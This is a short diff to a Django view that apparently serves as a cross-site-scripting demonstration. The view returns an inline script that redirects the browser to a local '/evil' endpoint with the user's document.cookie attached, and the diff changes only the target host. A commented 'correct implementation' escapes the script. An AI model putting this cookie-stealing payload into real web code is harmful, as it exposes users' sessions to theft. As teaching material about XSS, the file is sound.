@@ -7,7 +7,7 @@ from django.utils.html import escape
 @login_required
 def example(request):
     # return HttpResponse("Hello world")
-    return HttpResponse('<script>window.location = "http://127.0.0.1:8080/evil?cookie="+escape(document.cookie)</script>')
+    return HttpResponse('<script>window.location = "http://0.0.0.0:8080/evil?cookie="+escape(document.cookie)</script>')
     # Correct implementation:
     # return HttpResponse(escape('<script>alert("XSSです")</script>'))
 
